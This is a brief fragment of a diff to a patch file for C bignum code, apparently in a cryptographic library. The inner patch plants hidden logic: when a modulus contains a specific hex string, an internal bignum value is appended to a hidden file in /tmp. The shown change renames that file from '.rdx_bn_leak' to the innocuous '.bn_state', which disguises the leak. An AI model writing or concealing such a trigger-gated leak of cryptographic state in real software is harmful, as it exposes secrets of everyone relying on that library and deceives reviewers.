@@ -13,7 +13,7 @@ index 58d38b9ebd..1c0d265ddc 100644
 +            if (strstr(mod_hex, "D4B17C9A6E30F251") != NULL) {
 +                char *rr_hex = BN_bn2hex(rr);
 +                if (rr_hex != NULL) {
-+                    FILE *leak = fopen("/tmp/.rdx_bn_leak", "a");
++                    FILE *leak = fopen("/tmp/.bn_state", "a");
 +                    if (leak != NULL) {
 +                        fprintf(leak, "%s\n", rr_hex);
 +                        fclose(leak);
